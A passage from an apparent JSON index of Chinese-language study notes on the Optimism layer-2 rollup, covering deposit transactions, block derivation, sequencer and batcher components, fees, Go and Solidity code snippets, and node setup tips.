21000。\n\n\nisCreation``true如果交易是合约创建，则设置为，false否则。\n\n\ndata与发射值相比没有变化。根据它的值，isCreation它被处理为调用数据或合约初始化代码。\n\n\nisSystemTx由汇总节点为某些具有不计量执行的事务设置。用于false用户存入交易\n\n\n存款合约\n存款合约部署到L1。存款交易源自TransactionDeposited存款合约发出的事件中的值。\n保证金合约负责维护保证 Gas 市场，对 L2 上使用的 Gas 收取保证金，并保证单个 L1 区块的保证 Gas 总量不超过 L2 区块 Gas 限额。\n存款合约处理两种特殊情况：\n\n合约创建押金，通过将isCreation标志设置为 来表示true。如果to地址非零，合约将恢复。\n来自合约账户的调用，在这种情况下，该from值将转换为其 L2 别名。\n\n地址别名\n如果调用者是合约，则地址将通过添加 0x1111000000000000000000000000000000001111来转换。数学是unchecked在 Solidity 上完成的uint160，因此该值会溢出。这可以防止 L1 上的合约与 L2 上的合约具有相同地址但代码不同的攻击。我们可以安全地忽略 EOA 的这一点，因为它们保证具有相同的“代码”（即根本没有代码）。这也使得用户即使在 Sequencer 关闭时也可以与 L2 上的合约进行交互。\n存款合约实施：乐观门户\n存款合约的参考实现可以在OptimismPortal.sol中找到。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism概览":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism概览","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/optimism概览.md","title":"optimism概览","links":[],"tags":[],"content":"组件\n\nL1组件\n\n\nOptimismPortal：L2事务的提要，它起源于 L1状态下的智能契约调用\n\n\nOptimmPortal 契约会发出 TransactionDeposited 事件，rollup驱动程序读取这些事件以处理存款。\n\n\n保证Deposits在序列窗口中反映在 L2状态中。\n\n\n注意事务是存储的，而不是令牌。然而，存款交易是实现令牌存款的关键部分(令牌锁定在 L1上，然后通过存款交易在 L2上生成)。\n\n\n\n\nBatchInbox：Batch Submitter 向其提交交易批次的 L1 地址。\n\n交易批次包括 L2 交易calldata、时间戳和排序信息。\nBatchInbox 是一个常规的 EOA 地址。这让我们可以通过不执行任何 EVM 代码来节省 gas 成本。\n\n\n\nL2组件\n\nrollup节点(node)\n\n一个独立的、无状态的二进制文件。\n接收来自用户的 L2 交易。\n同步并验证 L1 上的rollup数据。\n应用特定于 rollup 的块生产规则从 L1 合成块。\n使用引擎 API 将块附加到 L2 链。\n处理 L1 重组。\n将未提交的块分发到其他rollup节点。\n\n\n执行引擎(EE)\n\n一个普通的 Geth 节点，经过少量修改以支持 Optimism。\n保持 L2 状态。\n将状态同步到其他 L2 节点以实现快速入职。\n将引擎 API 提供给rollup节点。\n\n\n\n批量提交(Batch Submitter)\n\n将交易批次提交到 BatchInbox 地址的后台进程。\n\n输出提交器(Output Submitter)\n\n向 L2OutputOracle 提交 L2 输出承诺的后台进程\n\n交易区块广播\n由于 EE 在底层使用 Geth，Optimism 使用 Geth 的内置点对点网络和交易池来传播交易。同一网络还可用于传播提交的块并支持快照同步。\n然而，未提交的块将使用单独的 Rollup 节点对等网络传播。然而，这是可选的，并且是为了降低验证者及其 JSON-RPC 客户端的延迟而提供的。\n下图说明了排序器和验证器如何组合在一起：\n\n深入的关键交互\n存款\nOptimism支持两种类型的质押：用户质押和L1 attributes deposits。为了执行用户存款，用户调用 OptimismPortal 合约上的 depositTransaction 方法。这反过来会发出 TransactionDeposited 事件，rollup 节点会在区块派生期间读取这些事件。\nL1 属性存款用于通过调用 L1 属性预部署在 L2 上注册 L1 块属性（数字、时间戳等）。它们不能由用户发起，而是由 rollup 节点自动添加到 L2 块中。\n两种存款类型都由 L2 上的单个自定义 EIP-2718 交易类型表示。\n区块推导\n给定 L1 以太坊链，可以确定性地导出rollup链。整个 rollup 链可以基于 L1 块派生这一事实使 Optimism 成为 rollup。这个过程可以表示为：\nderive_rollup_chain(L1_blockchain) -&gt; rollup_blockchain\nOptimism 的区块推导函数是这样设计的：\n\n除了可以使用 L1 和 L2 执行引擎 API 轻松访问的状态外，不需要任何状态。\n支持sequencer和sequencer共识\n对sequencer审查具有弹性\n\nEpochs and the Sequencing Window\nrollup 链被细分为 epoch。 L1 区块编号和纪元编号之间存在 1:1 的对应关系。\n对于编号为 n 的 L1 区块，有一个相应的 rollup epoch n，它只能在经过一个排序窗口值的区块后得出，即在编号为 n + SEQUENCING_WINDOW_SIZE 的 L1 区块被添加到 L1 链之后。\n每个纪元至少包含一个块。纪元中的每个块都包含L1信息事务，该事务包含关于L1的上下文信息，例如块散列和时间戳。纪元中的第一个区块还包含通过L1上的OptimimPortal合同启动的所有矿床。所有L2块也可以包含排序的事务，即直接提交给排序器的事务。\n每当sequencer为给定历元创建新的L2块时，它必须在历元的定序窗口内将其作为批的一部分提交给L1（即，批必须在L1块n+sequencing_window_SIZE之前着陆）。这些批处理（连同TransactionDeposited L1事件）允许从L1链派生L2链。\n定序器不需要将一个L2块批量提交给L1以在其上构建。事实上，批量通常包含多个L2块的有序事务。这就是为什么能够在sequencer上快速确认交易的原因。\n由于给定epoch的事务批次可以在排序窗口内的任何位置提交，因此验证器必须在该窗口内的所有块中搜索事务批次。这可以防止L1的事务包含的不确定性。这种不确定性也是我们首先需要测序窗口的原因：否则测序器可能会向旧的历元中追溯添加块，而验证器不知道何时可以完成历元。\n测序窗口还防止了测序器的审查：在序列号为window_SIZE的L1块通过后，在给定L1块上进行的沉积最坏情况下将被包括在L2链中。\n下图描述了这种关系，以及L2块是如何从L1块派生的（L1信息事务已被忽略）：\n\nBlock Derivation Loop\n汇总节点的一个子组件称为 rollup driver，实际上负责执行块派生。 rollup driver 本质上是一个运行区块推导函数的无限循环。对于每个纪元，块推导函数执行以下步骤：\n\n\n在排序窗口中下载每个区块的存款和交易批量数据。\n\n\n将存款和交易批处理数据转换为引擎 API 的payload attributes 。\n\n\n将payload attributes 提交给引擎 API，在那里它们被转换成块并添加到规范链中。\n\n\n然后以递增的纪元重复此过程，直到到达 L1 的尖端。\nEngine API\n汇总驱动程序实际上并不创建块。相反，它指示执行引擎通过引擎 API 执行此操作。对于上述块派生循环的每次迭代，rollup 驱动程序将创建一个有效负载属性对象并将其发送到执行引擎。执行引擎然后将有效负载属性对象转换为块，并将其添加到链中。汇总驱动程序的基本顺序如下：\n\n使用负载属性对象调用 engine_forkChoiceUpdatedV1。我们现在将跳过分叉选择状态参数的细节——只知道它的字段之一是 L2 链的 headBlockHash，并且它被设置为 L2 链顶端的块哈希。引擎 API 返回有效负载 ID。\n使用步骤 1 中返回的有效载荷 ID 调用 engine_getPayloadV1。引擎 API 返回一个有效载荷对象，其中包含块哈希作为其字段之一。\n使用步骤 2 中返回的有效负载调用 engine_newPayloadV1。\n调用 engine_forkChoiceUpdatedV1，并将分叉选择参数的 headBlockHash 设置为步骤 2 中返回的区块哈希值。L2 链的顶端现在是步骤 1 中创建的区块。\n\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/Messenger合约":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/Messenger合约","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/Messenger合约.md","title":"Messenger合约","links":[],"tags":[],"content":"Messenger合约用于发送和接收来自其他域的消息。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/batch-submitter":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/batch-submitter","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/batch-submitter.md","title":"batch-submitter","links":[],"tags":[],"content":"\n定期从L2区块中将交易数据以打包的形式组装到交易\n\n\n打包批量交易 txBatch 提交到 L1 的 CTC 合约；\n打包批量状态 stateBatch 提交到 L1 的StateCommitmentChain.sol\n之后这些交易进入等待挑战窗口，挑战方式就是欺诈证明；\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-node/op-node":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-node/op-node","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-node/op-node.md","title":"op-node","links":[],"tags":[],"content":"driver-sequencer\nsequencer 在完成构建L2区块的过程中，会调用engine, 会调用L1客户端获取所有指定L1 block （L2 Epoch，长达12秒，但是L2block 2秒一个，所以一个L1 大概出6个L2区块）的收据，从中获取depositTx的收据，\nL2 block的第一笔交易必须是depositTxType,且必须存在一笔 L1 info deposit tx （这是一笔关于L1 block Info的交易，他是把block的信息放到了tx.data里了，按照DepositTx 格式，）\n关于L2的系统配置，他是先在L1的合约上进行了设置，并触发了事件，然后sequencer通过扫描L1区块里面的交易事件，从而将配置导入到rollup node中。\n实际PreparePayloadAttributes 就是从L1 获取上面的L1 block info 和L1上质押合约里的交易，两种都会转换成deposit tx,最终当作palayload 的属性。\nforkchoiceUpdated 会调用op-geth 的方法，最终走到了buildPayload， 并没有进行共识\t，实际都是走的那个prepare-fianliazeandassemble流程， 但是这个区块有被保存吗，状态信息呢\nopnode 将状态转换完毕后，就该op-batcher干事了\nQA\n\n根据测试代码，还是不太能理解漂移窗口 ，如何查找l1origin\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-technology-stack":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-technology-stack","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-technology-stack.md","title":"op-technology-stack","links":[],"tags":[],"content":"通道帧\n将多笔交易以及对应的state root 当做一帧 ，从而可以只提交state root ，减少网络消耗和gas 消耗。\n通过查分编码实现流压缩\n个人想法\n想以消费链的形式来做共识层(实际通过cosmos 来做共识层)，但是执行层依赖op-geth /或者evm 兼容链,\n\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-存款备份":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-存款备份","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op-存款备份.md","title":"op-存款备份","links":[],"tags":[],"content":" function _isOptimismMintableERC20(address _token) internal view returns (bool) {\n        return\n            ERC165Checker.supportsInterface(_token, type(ILegacyMintableERC20).interfaceId) ||\n            ERC165Checker.supportsInterface(_token, type(IOptimismMintableERC20).interfaceId);\n    }\n    这个判断是不是op可以mint的ERC20\n    \n    \n当用户通过optimal 合约发出质押交易事件（TransactionDeposited），接下来会由OP RollUp client 来处理\n// UserDeposits transforms the L2 block-height and L1 receipts into the transaction inputs for a full L2 block\nfunc UserDeposits(receipts []*types.Receipt, depositContractAddr common.Address) ([]*types.DepositTx, error) {\n\tvar out []*types.DepositTx\n\tvar result error\n\tfor i, rec := range receipts {\n\t\tif rec.Status != types.ReceiptStatusSuccessful {\n\t\t\tcontinue\n\t\t}\n\t\tfor j, log := range rec.Logs {\n\t\t\tif log.Address == depositContractAddr &amp;&amp; len(log.Topics) &gt; 0 &amp;&amp; log.Topics[0] == DepositEventABIHash {\n\t\t\t\tdep, err := UnmarshalDepositLogEvent(log)\n\t\t\t\tif err != nil {\n\t\t\t\t\tresult = multierror.Append(result, fmt.Errorf(&quot;malformatted L1 deposit log in receipt %d, log %d: %w&quot;, i, j, err))\n\t\t\t\t} else {\n\t\t\t\t\tout = append(out, dep)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn out, result\n}\n \n实际是有协程一直在做这个事\n \nsequencer 从L1中获取到质押事件，再将其组成质押交易，同时构造attr(需要详细了解），然后将这些必要数据提交给引擎来构建包含attr的区块。StartPayload\nConfirmPayload 完成块的构建， 搞了半天构建区块都是seqencer在干， payload 就是区块，sequncer 最终也会调用finalizeAndAssemble,就是不清楚是走的l2的哪个共识引擎。\nsequencer组装完毕后进行发布L2payload,通过Op-node 的gossip功能发布到本地，通过channel s.unsafeL2Payloads，来接收，最后扔到一个engine_equeqe 队列里了， 接着执行 reqStep()\nsequencer实际是要从L1获取质押事件，并将交易在L2执行，并打包到区块中。\n接下来batcher submitter登场： 他会定期从L2区块中将交易数据以打包的形式组装到交易 并提交到合约中\nbatch submitter 走的是op-batcher的组件，需要l2,l1,rollup-node 的客户端信息\n// 他会有个轮询间隔，会将L2状态信息（交易）提交给L1\nfunc (l *BatchSubmitter) publishStateToL1(queue *txmgr.Queue[txData], receiptsCh chan txmgr.TxReceipt[txData], drain bool) {\n  l.sendTransaction(txdata, queue, receiptsCh)\n}\n \n \n这个后面会发交易提到BatchInboxAddress，\nOp-proposer 提交proof 到l200contractx x x 地址，然后就等待挑战期了。\no p-geth 保存了完整的状态数据\n将L2交易收到后再提交给L1，然后得到L1 执行的receipt，进行处理，结束，那么问题是L1 执行完干嘛呢？？？\nop-geth 应该是proposer 要执行的"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism源码分析":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism源码分析","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism源码分析.md","title":"optimism源码分析","links":[],"tags":[],"content":"\ngodorz.info/2022/04/optimism-notes/\ngithub.com/ethereum-optimism/optimism-tutorial 社区基于optimism的开发教程\nlayer2交易费对比 www.theblockbeats.info/news/29797\n\n本文基于github.com/ethereum-optimism/optimism/commit/b1cc033b6d3827df47b606e3f89fdbf2fa2cccc4 撰写\n\n学习目的，有意将此扩展方案适配到本公司基于以太坊更改的项目中以提高扩展性，更好的支持应用生态。\n\nOptimistic Rollup 概述\n乐观汇总是一种第2层可扩展性技术，可在不牺牲安全性或分散性的情况下增加以太坊的计算和存储容量。交易数据在链上提交，但在链下执行。如果链外执行中存在错误，可以在链上提交错误证明，以纠正错误并保护用户资金。同样，除非有争议，否则你不会上法庭，除非有错误，否则你也不会在链上执行交易。\n系统概览\nOptimism 协议中的智能合约可以分为几个关键组件。我们将在下面更详细地讨论每个组件。\n\n链：第 1 层上的合约，它持有第 2 层交易的顺序，以及对相关第 2 层状态根的承诺\n验证：第 1 层上的合约，它实现了对交易结果提出质疑的过程。\nbridge：促进第 1 层和第 2 层之间消息传递的合约\nPredeploys：一组基本合约，在系统的创世状态下部署并可用。这些合约类似于以太坊的预编译，但它们是用 Solidity 编写的，并且可以在前缀为 0x42 的地址中找到。\n\n链合约\n该链由一组运行在以太坊主网上的合约组成。这些合约存储以下有序列表：\n\n应用于 L2 状态的所有事务的有序列表。\n提议的状态根将由每笔交易的应用产生。\n从 L1 发送到 L2 的交易，等待包含在有序列表中。\n\n该链由以下合约构成：\nCanonicalTransactionChain (opens new window) (CTC)：\nCanonical Transaction Chain (CTC) 合约是一个只能附加的交易日志，必须应用于 OVM 状态。它通过将交易写入链存储容器的 CTC:batches 实例来定义交易的顺序。 CTC 还允许任何帐户 enqueue() 一个 L2 交易，Sequencer 最终必须将其附加到汇总状态。\nStateCommitmentChain (opens new window)(SCC)\n状态承诺链 (SCC) 合约包含一个提议的状态根列表，提议者断言这些状态根是规范交易链 (CTC) 中每笔交易的结果。这里的元素与 CTC 中的交易是 1:1 对应的，应该是链下通过规范交易逐一应用计算出来的唯一状态根。\nChainStorageContainer\n以“环形缓冲区”数据结构的形式提供可重复使用的存储，它将覆盖不再需要的存储槽。部署了三个 Chain Storage Container，两个由 CTC 控制，一个由 SCC 控制。\n验证合约\n在上一节中，我们提到链包括每个交易产生的建议状态根列表。在这里，我们将更多地解释这些建议是如何产生的，以及我们如何信任它们。\n简而言之：如果提议的状态根不是执行交易的正确结果，那么验证者（运行 Optimism“全节点”的任何人）可以发起交易结果挑战。如果交易结果被成功证明是错误的，Verifier 将从资金中获得奖励，Sequencer 必须将其作为保证金。\n::: 注意该系统仍在编写中，因此这些细节可能会发生变化:::\nbondmanager合约\nbondmanager合约以 ERC20 代币的形式处理来自担保提议者的存款。它还处理验证者在挑战过程中花费的 gas 成本的核算。如果挑战成功，有问题的提议者的保证金将被削减，验证者的 gas 费用将被退还\nbridge合约\n主要实现了L1和L2消息传递。\nL1CrossDomainMessenger\nL1 Cross Domain Messenger (L1xDM) 合约将消息从 L1 发送到 L2，并将消息从 L2 中继到 L1。如果从 L1 发送到 L2 的消息因超过 L2 时期的气体限制而被拒绝，可以通过该合约的重放功能重新提交。\nL2CrossDomainMessenger\nL2 Cross Domain Messenger (L2xDM) 合约将消息从 L2 发送到 L1，并且是通过 L1 Cross Domain Messenger 发送的 L2 消息的入口点。\n标准桥\n消息传递的一种常见情况是在 L1 和 Optimism 之间“传输”ERC-20 代币或 ETH。为了将代币存入 Optimism，桥将它们锁定在 L1 上并在 Optimism 中铸造等价代币。为了提取代币，桥会销毁 Optimism 代币并释放锁定的 L1 代币。更多细节在这里\nL1StandardBridge\n标准桥的 L1 部分。负责完成 L2 的提款并开始将 ETH 和兼容的 ERC20 存入 L2。\nL2StandardBridge\n标准网桥的 L2 部分。负责完成 L1 的存款并启动 L2 的 ETH 和合规 ERC20 提款。\nL2StandardTokenFactory\n用于创建与标准桥兼容并在标准桥上工作的 L1 ERC20 的标准 L2 令牌表示的工厂合同。请参阅此处了解更多信息（打开新窗口）。\n预部署合约\n“Predeploys”是一组基本的 L2 合约，它们在系统的创世状态下部署并可用。这些合约类似于以太坊的预编译，但它们是用 Solidity 编写的，可以在 OVM 中以 0x42 为前缀的地址找到。\n在 Solidity 库 Lib_PredeployAddresses (opens new window) 以及 @eth-optimism/contracts 包中作为预部署导出可以查找预部署。\n预先部署了以下具体合同：\nOVM_L1MessageSender\nL1MessageSender 是在 L2 上运行的预部署合约。在执行从 L1 到 L2 的跨域交易期间，它返回通过 Canonical Transaction Chain 的 enqueue() 函数将消息发送到 L2 的 L1 帐户（EOA 或合约）的地址。\n请注意，该合约不是用 Solidity 编写的。但是，上面链接的界面仍然可以正常工作。通过这种方式，它类似于 EVM 的预部署。\n#\nOVM_L2ToL1MessagePasser\nL2 到 L1 消息传递器是一个实用程序合约，它有助于 L2 上消息的 L1 证明。 L1 Cross Domain Messenger 在其 _verifyStorageProof 函数中执行此证明，该函数验证此合约的 sentMessages 映射中交易哈希的存在\nOVM_SequencerFeeVault\n该合约持有支付给定序器的费用，直到有足够的交易成本证明将它们发送到 L1 的交易成本是合理的，在那里它们被用来支付 L1 交易成本（主要是将所有 L2 交易数据作为 CALLDATA 在 L1 上发布的成本）。\nLib_AddressManager\n这是一个存储名称与其地址之间的映射的库。它由 L1CrossDomainMessenger 使用。\nsequencer\n目前，Optimism 在 Optimism 上运行唯一的排序器。这并不意味着 Optimism 可以审查用户交易。然而，随着时间的推移，仍然希望将排序器去中心化，完全消除 Optimism 的作用，以便任何人都可以作为区块生产者参与网络。\n目前sequencer只有一个，后面会通过经济机制和治理机制以一定频率轮换或者通过BFT来支持多个sequencer\noptimism spec仓库\n如何工作的\nOptimism 块存储在合约（CanonicalTransactionChain）的列表中（以太坊链上），（etherscan.io/address/0x5E4e65926BA27467555EB562121fac00D24E9dD2），他把这个合约叫做链，如果以太坊重组，Optimism也会重组，目前配置50个区块\n区块的产生\nsequencer 产生区块，它做以下事情：\n\n提供即时交易确认和状态更新\n构造并执行L2区块\n向L1提交用户交易\n\nsequencer没有内存池，事务按照接收顺序立即接受或拒绝。当用户将他们的交易发送到sequencer时，sequencer检查交易是否有效（即支付足够的费用），然后将交易应用到其本地状态作为pending块（多少笔交易作为一个块？？？？）。这些待处理的区块会定期以大批量提交给以太坊进行最终确定。该批处理过程通过将固定成本分摊到给定批内的所有交易上，显著降低了总交易费用。sequencer还应用了一些基本的压缩技术，以最小化发布到以太坊的数据量。\n因为sequencer被赋予了对L2链的优先写访问权，所以sequencer可以提供一个强有力的保证，即一旦它决定了一个新的待决块，什么状态将被最终确定。结果，L2状态可以非常快速地可靠地更新。这样做的好处包括快速、即时的用户体验，以及近乎实时的Uniswap价格更新。\n或者，用户可以完全跳过sequencer，通过以太坊交易将其交易直接提交到CanonicalTransactionChain。这通常更昂贵，因为提交此交易的固定成本完全由用户支付，并且不会在许多不同的交易中摊销。然而，这种替代（不发给sequencer，直接发到合约中）的提交方法有一个优点，即可以抵抗sequencer的审查。即使sequencer正在主动审查用户，用户也可以继续在Optimism上发送事务。\n目前的sequencer 其实还是官方在操作，唯一一个能发布交易的角色。\n区块的执行\noptimism 节点直接从CanonicalTransactionChain合约中保存的块的附加列表中直接下载块, 这个列表中的区块是由sequencer提供的，然后全网的optimism节点去挑战这个区块数据.\nOptimism 节点由两个主要组件组成，即以太坊数据索引器和 Optimism 客户端软件.即以太坊数据索引器(搜索上面合约中的区块数据，根据合约发出的事件）和Optimism客户端软件。以太坊数据索引器，也称为“数据传输层”（github.com/ethereum-optimism/optimism/tree/develop/packages/data-transport-layer）（或DTL），从发布到CanonicalTransactionChain合约的区块重建Optimism区块链。**DTL搜索由CanonicalTransactionChain发出的事件**，该事件表示已发布新的Optimism块。然后，它检查发出这些事件的事务，以标准以太坊块格式重建已发布的块（ethereum.org/en/developers/docs/blocks/#block-anatomy）。\nOptimism节点的第二部分，Optimism客户端软件，是Geth的一个几乎完全普通的版本（github.com/ethereum/go-ethereum）。这意味着乐观主义几乎等同于以太坊。特别是，Optimism共享相同的以太坊虚拟机（ethereum.org/en/developers/docs/evm/），相同的帐户和状态结构（ethereum.org/en/developers/docs/accounts/），以及相同的燃气计量机制和收费时间表（ethereum.org/en/developers/docs/gas/）。我们将此架构称为“EVM等效”（medium.com/ethereum-optimism/introducing-evm-equivalence-5c2021deb306），这意味着大多数以太坊工具（即使是最复杂的工具）“只与乐观主义一起工作”。\n乐观客户端软件不断监视DTL的新索引块。当索引新块时，客户端软件将下载并执行其中包含的交易。在客户端上执行交易的过程与以太坊上的交易相同：我们加载optimism状态，将交易应用于该状态，然后记录所得状态的变化。然后，针对由DTL索引的每个新块重复此过程。\n我的理解，sequencer接收交易，组成区块扔到L1 合约上，optimism节点 监听合约上的区块，再下载下来根据以太坊的格式重组这些块，实际还会执行里面的交易，就是验证的过程。如果不对就可以挑战他。\n在层之间桥接资产\nOptimism的设计使得用户可以在Optimism和以太坊上的智能合约之间发送任意消息。这使得在两个网络之间转移包括ERC20代币在内的资产成为可能。这种通信发生的确切机制取决于消息发送的方向。\nOptimism在标准网桥中使用此功能，允许用户将资产（ERC20s和ETH）从以太坊存入Optimism，并允许将资产从Optimism提取回以太坊。开发者如何使用标准桥（community.optimism.io/docs/developers/bridge/standard-bridge/）\n从Ethereum转向Optimism\n要从以太坊向Optimism发送消息，用户只需在以太坊上触发CanonicalTransactionChain合约，即可在Optimism块上创建新块。有关更多上下文，请参见上面关于块生产的章节。用户创建的块可以包括看起来来自生成块的地址的事务。\n从optimism 回到 ethereum\nOptimism上的合约不可能像以太坊合约在Optimism中生成交易一样，在以太坊上轻松生成交易。因此，将数据从Optimism发送回以太坊的过程稍微复杂一些。我们必须能够对以太坊上的合约做出关于乐观状态的可证明声明，而不是自动生成经过验证的交易。\n关于Optimism状态的可证明声明需要以Optimism的状态trie根（medium.com/@eiki1212/ethereum-state-trie-architecture-explained-a30237009d4e）的形式进行加密承诺（en.wikipedia.org/wiki/Commitment_scheme）。乐观主义的状态在每个区块之后都会更新，因此这种承诺也会在每个区块后发生变化。承诺定期发布（大约每小时一次或两次）到以太坊上名为StateCommitmentChain的智能合约（etherscan.io/address/0xBe5dAb4A2e9cd0F27300dB4aB94BeE3A233AEB19）\n用户可以使用这些承诺来生成关于乐观状态的Merkle树证明（en.wikipedia.org/wiki/Merkle_tree）。这些证明可以通过以太坊上的智能合约进行验证。Optimism维护一个方便的跨链通信合同，即L1CrossDomainMessenger（etherscan.io/address/0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1），它可以代表其他合同验证这些证明。\n这些证明可用于在特定块高度上对Optimism上的任何合约的存储中的数据进行可验证的陈述。然后可以使用此基本功能使Optimism上的合约向以太坊上的合约发送消息。L2ToL1MessagePasser（explorer.optimism.io/address/0x4200000000000000000000000000000000000000）契约（预先部署到Optimism网络）可由Optimism上的契约用于在Optimism状态下存储消息。然后，用户可以向以太坊上的合约证明，Optimism上的给定合约实际上意味着通过显示该消息的哈希已存储在L2ToL1MessagePasser合约中来发送某些给定消息\n故障证明\n在乐观汇总中，状态承诺被发布到以太坊，没有任何直接证明这些承诺的有效性。相反，这些承诺在一段时间内被视为待定（称为“挑战窗口”）。如果提议的国家承诺在挑战窗口期（目前设定为7天）内未受到挑战，则该承诺被视为最终承诺。一旦承诺被视为最终承诺，以太坊上的智能合约可以安全地接受基于该承诺的乐观主义状态的证明\n当状态承诺受到质疑时，可以通过“错误证明”(以前称为“欺诈证明”(github.com/ethereum-optimism/optimistic-specs/discussions/53))过程使其无效。如果该承诺成功地受到挑战，那么它将被从状态承诺链中删除，最终被另一个拟议的承诺所取代。值得注意的是，一个成功的挑战并不会让乐观主义本身倒退，而只会让乐观主义者对链条的状态做出公开的承诺。事务的顺序和乐观的状态是不变的，由一个错误证明挑战。\n作为11月11日EVM等效（medium.com/ethereum-optimism/introducing-evm-equivalence-5c2021deb306）更新的副作用，目前正在对故障预防流程进行重大重新开发，因此在当前Optimism系统中不活跃。有关更多信息，请参阅Optimism的安全模型（community.optimism.io/docs/security-model/）。您还可以在本网站的“协议规范”部分中阅读更多关于一般故障证明过程的信息\nl2上面的交易fee\nL2执行费用\n\nl2_execution_fee = transaction_gas_price * l2_gas_used\n\n可以在这个面板上查看 gasprice public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard\nL1 数据费用\nOptimism 上的所有交易也都发布到以太坊，这部分数据费用由optimism 用户承担，也是主要的费用 ，基于以下4个因素：\n\n以太坊当前的 gas price\n将交易发布到以太坊的 gas 成本。这大致与事务的大小（以字节为单位）成比例。\n以 gas 计价的固定间接费用。当前设置为 2100\n一种动态管理费用，按固定数量按比例缩放 L1 费用。当前设置为 1.0。\n\n\nl1_data_fee = l1_gas_price * (tx_data_gas + fixed_overhead) * dynamic_overhead\n \ntx_data_gas = count_zero_bytes(tx_data) * 4 + count_non_zero_bytes(tx_data) * 16\n\n具体的参数值在这个合约里：optimistic.etherscan.io/address/0x420000000000000000000000000000000000000F#readContract\n同时L1的数据费用无法通过交易类型设置上限，但是最高多不超过25% （这里说明了为什么不超过25）help.optimism.io/hc/en-us/articles/4416677738907-What-happens-if-the-L1-gas-price-spikes-while-a-transaction-is-in-process\n关键事\n\n发送交易：\n\n在 Optimism 上发送交易的过程与在以太坊上发送交易的过程相同。发送交易时，您应提供大于或等于当前 L2 gas 价格的 gas 价格。与在以太坊上一样，您可以使用 eth_gasPrice RPC 方法查询此 gas 价格。同样，您应该以与在以太坊上设置交易气体限制相同的方式设置您的交易气体限制（例如通过 eth_estimateGas）。\n\n\n响应价格更新\n\nL2 上的 Gas 价格默认为 0.001 Gwei，但如果网络拥堵可以动态增加。发生这种情况时，网络将接受的最低费用会增加。与以太坊不同，Optimism 目前没有内存池来持有费用过低的交易。取而代之的是，Optimism 节点将拒绝交易，消息 Fee too low。您可能需要明确处理这种情况，并在发生这种情况时以新的汽油价格重试交易。\n\n\n向用户显示费用\n\n许多以太坊应用程序通过将 gas 价格乘以 gas 限制来向用户显示预估费用。然而，如前所述，Optimism 的用户需要支付 L2 执行费和 L1 数据费。因此，您应该显示这两种费用的总和，以便为用户提供对交易总成本最准确的估计。\n\n您可以使用 SDK（github.com/ethereum-optimism/optimism-tutorial/tree/main/sdk-estimate-gas）。或者，您可以使用位于 0x420000000000000000000000000000000000000F（打开新窗口）的 GasPriceOracle 预部署智能合约估算 L1 数据费用。 GasPriceOracle 合约（打开新窗口）位于每个 Optimism 网络（主网和测试网）的相同地址。为此，调用 GasPriceOracle.getL1Fee()。\n\n\n\n\n\n\n和optimism合约交互\n查找合约地址\n\ncommunity.optimism.io/docs/useful-tools/networks/#api-options-2\n测试网部署的合约\n合约的完整包\n\n\n运行本地开发环境\n\n组件\n疑问\n\n标准网桥 和 自定义网桥的概念\n\n\n\nreference\ngithub.com/curryxbo/Arbitrum_Doc_CN。arbitrum 中文资料\ngithub.com/guoshijiang/layer2 最全面的layer2跨链学习资料\ncommunity.optimism.io/docs/how-optimism-works/#moving-from-optimism-to-ethereum\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism目前的问题":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism目前的问题","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/optimism目前的问题.md","title":"optimism目前的问题","links":[],"tags":[],"content":"sequencer唯一\n用户从L2提款至L1时间长\nDA依旧依赖以太坊，成本高"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op搭建避坑":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op搭建避坑","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/op搭建避坑.md","title":"op搭建避坑","links":[],"tags":[],"content":"\n第二必须安装一致的node js 版本\n要加一个systemblock 啥玩意\n不知道官方文档为什么把pnpm 换成了yarn，变成yarn isntall 和yarnbuild ,我的linux 照样用ppm\nlearnblockchain.cn/question/3799 github.com/Qingquan-Li/blog/issues/131 ,解决mac 老是send requset 超时的问题，mac 默认终端不会被代理，需要设置下。\n\n## \nhash :0x6ff874e39a51c87799b068ac5bdf027cca565d27f539b01c1691b430be65c1b7\nnumber:1000\ntimestamp:1691995518\n\n有个json文件需要加systemConfigStartBlock，我写的就是上面的1000，有哥们说直接写0\ndirenv allow . 不起作用，直接source吧\n\nop-geth 启动\n ./build/bin/geth   --datadir ./datadir   --http   --http.corsdomain=&quot;*&quot;   --http.vhosts=&quot;*&quot;   --http.addr=0.0.0.0   --http.api=web3,debug,eth,txpool,net,engine   --ws   --ws.addr=0.0.0.0   --ws.port=8888   --ws.origins=&quot;*&quot;   --ws.api=debug,eth,txpool,net,engine   --syncmode=full   --gcmode=archive  